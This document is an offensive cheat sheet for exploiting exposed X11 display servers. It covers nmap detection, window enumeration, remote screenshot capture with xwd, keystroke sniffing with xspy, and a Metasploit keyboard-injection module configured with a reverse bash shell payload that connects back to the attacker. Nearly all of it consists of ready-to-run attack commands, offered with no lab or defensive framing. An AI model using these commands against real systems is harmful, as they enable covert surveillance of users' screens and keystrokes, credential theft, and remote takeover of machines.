# X11 

## Detection
### nmap
```
nmap -sV -p 6000-6010 <TARGET_IP>

# Check whether the server allows unauthenticated connections (xhost + style access)
nmap -p 6000 --script x11-access <TARGET_IP>

# XDMCP (older remote login/display protocol which could also expose X11 displays if enabled)
nmap -sU -p 177 <TARGET_IP>
```

## Enumeration

### xwininfo
```
xwininfo -root -tree -display 192.168.1.109:0
```
- `-root` = target the root window
- `-tree` = displays the names of the windows/show window hierarchy + names
- `-display` = specify the remote X server/display to connect to


## Post-Exploitation

### Screenshot Capture with XWD

**Note:** `xwd` dumps a window (or root) to `.xwd` format. We can use the xwd to take a screenshot of the Xserver,in `xwd` format.
```
xwd -root -screen -silent -display 192.168.1.109:0 > screenshot.xwd
```
- `-root` = indicates that the root window should be selected for the window dump
- `-screen` = indicates that the GetImage request was used to obtain the image
- `-silent` = Operate silently, i.e., don’t ring any bells before and after dumping the window.
- `-display` = specify the server to connect to/remote display target

#### Convert to PNG/JPG
```
convert screenshot.xwd screenshot.png
```

### Keystroke Sniffing with XSPY
```
xspy -display 192.168.1.109:0
```

- `xpsy` is a Kali tool used to capture keystrokes from an open X display (when access control allows it).


## Exploitation - Metasploit
### X11 Keyboard Command Injection
```
use unix/x11/x11_keyboard_exec
set RHOST <TARGET_IP>
set LHOST <YOUR_IP>
set LPORT 4444
set payload cmd/unix/reverse_bash
set time_wait 10
run
```
- This module attempts to open a terminal and inject keystrokes to run a payload, granting a remote shell.
- **Note:** X11 is a visible interface — the victim may see the injections happening.